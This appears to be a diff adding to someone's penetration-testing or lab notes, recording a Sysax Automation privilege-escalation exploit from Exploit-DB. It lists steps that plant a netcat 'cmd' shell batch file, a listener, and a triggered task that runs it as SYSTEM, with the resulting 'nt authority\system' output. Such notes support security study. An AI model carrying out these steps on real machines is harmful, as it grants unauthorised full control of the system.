@@ -2213,6 +2213,28 @@ The command completed successfully.
 
 searching sysaxautomation privesc
 
+https://www.exploit-db.com/exploits/50834
 
+```txt
+1. Create folder c:\temp
+2. Download netcat (nc.exe) to c:\temp
+3. Create file 'pwn.bat' in c:\temp with contents
+	c:\temp\nc.exe localhost 1337 -e cmd
+4. Open command prompt and netcat listener
+	nc -nlvvp 1337
+5. Open sysaxschedscp.exe from C:\Program Files (x86)\SysaxAutomation
+6. Select Setup Scheduled/Triggered Tasks
+	- Add task (Triggered)
+	- Update folder to monitor to be c:\temp
+	- Check 'Run task if a file is added to the monitor folder or subfolder(s)'
+	- Choose 'Run any other Program' and choose c:\temp\pwn.bat
+	- Uncheck 'Login as the following user to run task'
+	- Finish and Save
+7. Create new text file in c:\temp
+8. Check netcat listener
+	C:\WINDOWS\system32>whoami
+	whoami
+	nt authority\system
+```
 
 
